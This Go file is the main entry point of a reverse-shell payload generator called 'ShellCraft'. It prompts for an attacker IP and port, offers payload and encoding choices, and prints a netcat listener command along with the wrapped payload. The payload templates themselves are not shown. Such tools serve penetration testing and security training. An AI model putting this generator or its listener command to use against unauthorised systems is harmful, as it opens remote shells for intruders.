package main

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

const banner = `
  ____  _          _ _  ____             __ _ 
 / ___|| |__   ___| | |/ ___|_ __ __ _ / _| |_ 
 \___ \| '_ \ / _ \ | | |   | '__/ _' | |_| __|
  ___) | | | |  __/ | | |___| | | (_| |  _| |_ 
 |____/|_| |_|\___|_|_|\____|_|  \__,_|_|  \__|
      Local Reverse Shell Payload Generator
`

func main() {
	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\n[!] Exiting gracefully...")
		os.Exit(0)
	}()

	fmt.Println(banner)

	// 1. Get Attacker IP
	ip := GetValidatedIP("Attacker IP")

	// 2. Get Attacker Port
	port := GetValidatedPort("Attacker Port")

	// 3. Select Payload Type
	payloads := GeneratePayloads(ip, port)
	payloadNames := make([]string, len(payloads))
	for i, p := range payloads {
		payloadNames[i] = p.Name
	}
	payloadIdx := SelectOption("Select Payload Type", payloadNames)
	selectedPayload := payloads[payloadIdx]

	// 4. Select Encoding/Wrapper
	encoders := GetEncoders()
	encoderNames := make([]string, len(encoders))
	for i, e := range encoders {
		encoderNames[i] = e.Name
	}
	encoderIdx := SelectOption("Select Encoding/Wrapper", encoderNames)
	selectedEncoder := encoders[encoderIdx]

	// 5. Generate and Print
	finalPayload := selectedEncoder.Wrap(selectedPayload.Code)

	fmt.Printf("\n" + strings.Repeat("=", 60))
	fmt.Printf("\n[+] Listener Command:\n    nc -lvnp %d\n", port)
	fmt.Printf("\n[+] Finalized Payload (%s - %s):\n\n%s\n", selectedPayload.Name, selectedEncoder.Name, finalPayload)
	fmt.Printf("\n" + strings.Repeat("=", 60) + "\n")
}
